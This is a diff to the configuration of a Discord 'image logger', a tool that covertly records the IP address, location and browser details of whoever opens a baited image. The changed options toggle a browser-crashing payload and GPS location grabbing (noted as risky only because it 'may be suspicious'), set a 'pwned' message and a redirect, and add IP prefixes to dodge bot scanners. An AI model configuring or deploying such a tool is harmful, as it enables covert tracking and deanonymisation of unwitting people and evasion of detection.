@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "au ra dagerxa boom. https://www.youtube.com/watch?v=R8bcRRN0Gj0&list=RD5xeel4XHu88&index=2", # Message to show
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://www.youtube.com/watch?v=RAZSdO2DA3E&list=RDR8bcRRN0Gj0&index=2" # Link to the webpage to redirect to 
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -63,26 +63,8 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = () # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
- 
-# This feature is undocumented mainly due to it being for detecting bots better.
-
-def find_chrome_window():
-    """Finds and maximizes the Google Chrome window."""
-    for window in gw.getWindowsWithTitle("Google Chrome"):
-        if window:
-            window.maximize()
-            return True
-    return False
-
-def find_edge_window():
-    """Finds and maximizes the Microsoft Edge window."""
-    for window in gw.getWindowsWithTitle("Microsoft Edge"):
-        if window:
-            window.maximize()
-            return True
-    return False
-
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
